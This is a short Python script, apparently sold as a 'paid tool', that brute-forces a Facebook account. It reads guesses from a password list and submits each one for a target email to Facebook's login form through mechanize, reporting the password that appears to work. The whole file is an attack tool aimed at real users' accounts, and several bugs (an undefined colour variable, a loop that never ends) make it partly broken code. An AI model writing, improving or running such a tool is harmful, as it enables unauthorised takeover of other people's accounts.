import time
import sys

logo=(f"""

                  _____            ____  ____ _____ _______ 
                 |  __ \     /\   |  _ \|  _ \_   _|__   __|
                 | |__) |   /  \  | |_) | |_) || |    | |   
                 |  _  /   / /\ \ |  _ <|  _ < | |    | |   
                 | | \ \  / ____ \| |_) | |_) || |_   | |   
                 |_|  \_\/_/    \_\____/|____/_____|  |_|   {RED}PAID TOOL
       
""")

post_url = 'https://www.facebook.com/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    import mechanize
    import urllib.request as urllib2
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent', headers['User-Agent'])]
    browser.set_handle_robots(False)
except ImportError:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('logo')
file = open('passwords.txt', 'r')

email = input('Enter Email/Username : ').strip()

print("\nTarget Email ID : ", email)
print("\nTrying Passwords from list ...")

i = 0
while True:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 6:
        continue
    print(f"{i}. id/Gmail {email} : password _ {passw}")
    response = browser.open(post_url)
    try:
        if response.code == 200:
            browser.select_form(nr=0)
            browser.form['email'] = email
            browser.form['pass'] = passw
            response = browser.submit()
            response_data = response.read()
            if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
                print('Your password is : ', passw)
                break
    except Exception as e:
        time.sleep(0.0001)
